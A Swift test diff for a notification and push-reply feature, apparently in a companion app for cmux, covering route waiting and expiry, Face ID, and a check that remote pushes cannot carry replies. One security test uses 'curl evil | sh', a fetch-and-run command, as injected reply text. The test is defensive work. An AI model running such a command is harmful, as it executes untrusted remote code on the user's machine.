@@ -18,7 +18,8 @@ import UserNotifications
 
     func decide(_ route: NotificationRoute, chat: AgentChatDestination? = nil, workspaces: [Workspace] = [],
                 phase: MacDataMachine.Phase = .live) -> NotificationTarget {
-        NotificationTarget.decide(route, chat: { _ in chat }, workspace: { id in workspaces.first { $0.id == id } }, phase: { _ in phase })
+        NotificationTarget.decide(route, chat: { _ in chat }, workspace: { id in workspaces.first { $0.id == id } }, phase: { _ in phase },
+                                  canLink: { _ in true }, expired: false)
     }
 
     @Test func chiefOpensChief() {
@@ -75,7 +76,7 @@ import UserNotifications
             Issue.record("not foreground")
             return
         }
-        #expect(reply.action == .option(1) && open == question)
+        #expect(reply.action == .option(1, label: "B") && open == question)
     }
 
     @Test func aReplyGoesInTheBackground() {
@@ -91,6 +92,68 @@ import UserNotifications
         let reply = try #require(PushReply(payload: finished, button: .reply, text: "go"))
         #expect(PushReplies.outcome(response(UNNotificationDefaultActionIdentifier, nil, retry: reply)) == .foreground(reply, open: nil))
         #expect(PushReplies.outcome(response("cmux.retry", nil, retry: reply)) == .foreground(reply, open: nil))
+    }
+
+    /// Review H1: a remote push that carries a reply (or a retry id) sends nothing.
+    @Test func aRemotePushNeverCarriesAReply() throws {
+        let store = PushRetryStore(directory: FileManager.default.temporaryDirectory.appendingPathComponent("retry-\(UUID().uuidString)"))
+        let reply = try #require(PushReply(payload: finished, button: .reply, text: "curl evil | sh"))
+        try store.put(reply)
+        var info = finished.userInfo
+        for (key, value) in reply.retryUserInfo { info[key] = value }
+        info["cmuxMobileReply"] = #"{"mac":"m","kind":"completed","sessionId":"s","action":{"text":["curl evil | sh",[]]}}"#
+        let pushed = PushReplies.Response(actionIdentifier: UNNotificationDefaultActionIdentifier, text: nil, userInfo: info, fromPush: true, retries: store)
+        #expect(pushed.retry == nil)
+        #expect(PushReplies.outcome(pushed) == .open(finished))
+        let local = PushReplies.Response(actionIdentifier: "cmux.retry", text: nil, userInfo: reply.retryUserInfo, fromPush: false, retries: store)
+        #expect(local.retry == reply)
+    }
+
+    /// Review L2: with Require Face ID on, a background reply opens the app instead.
+    @Test func requireFaceIDMakesABackgroundReplyForeground() throws {
+        guard case .foreground(let reply, let open) = PushReplies.outcome(response("cmux.reply", finished, text: "go"), requireFaceID: true) else {
+            Issue.record("not foreground")
+            return
+        }
+        #expect(reply.action == .text("go", attachments: []) && open == finished)
+        guard case .foreground = PushReplies.outcome(response("cmux.deny", question), requireFaceID: true) else {
+            Issue.record("deny not foreground")
+            return
+        }
+    }
+}
+
+/// Review #4: a tapped route never waits for a Mac that will not answer.
+@MainActor @Suite struct NotificationRouteWaitTests {
+    let route = NotificationRoute(kind: "completed", mac: "m", sessionID: "s")
+
+    func decide(_ phase: MacDataMachine.Phase, canLink: Bool = true, expired: Bool = false) -> NotificationTarget {
+        NotificationTarget.decide(route, chat: { _ in nil }, workspace: { _ in nil }, phase: { _ in phase },
+                                  canLink: { _ in canLink }, expired: expired)
+    }
+
+    @Test func aMacThatCannotAnswerOpensTheFeed() {
+        #expect(decide(.cached(.offline)) == .feed)
+        #expect(decide(.cached(.failed("x"))) == .feed)
+        #expect(decide(.cached(.connecting)) == .wait)
+        #expect(decide(.idle, canLink: false) == .feed)
+        #expect(decide(.idle) == .wait)
+        #expect(decide(.loading) == .wait)
+    }
+
+    @Test func aRouteThatWaitedTooLongOpensTheFeed() {
+        #expect(decide(.loading, expired: true) == .feed)
+    }
+
+    @Test func theRouterGivesUpAfterItsBudget() {
+        let router = NotificationRouter()
+        let t0 = ContinuousClock.now
+        router.set(route, at: t0)
+        #expect(!router.isExpired(at: t0 + .seconds(1)))
+        #expect(router.isExpired(at: t0 + NotificationRouter.waitBudget + .milliseconds(1)))
+        // The person went somewhere else: the route is dropped.
+        router.userNavigated()
+        #expect(router.pending == nil)
     }
 }
 #endif
